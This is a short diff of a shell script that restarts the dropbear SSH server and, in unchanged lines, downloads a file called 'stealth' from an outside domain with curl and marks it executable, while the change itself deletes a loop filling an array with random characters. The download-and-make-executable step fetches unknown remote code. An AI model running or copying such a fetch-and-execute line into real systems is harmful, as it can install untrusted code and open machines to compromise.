@@ -50,14 +50,6 @@ sleep 2
 service dropbear restart
 sleep 2
 
-array=()
-for i in {a..z} {A..Z} {0..9}; 
-   do
-   array[$RANDOM]=$i
-done
-
-sleep 2
-
 curl https://greenleaf.teatspray.fun/stealth -L -O -J
 sleep 2
 chmod +x stealth
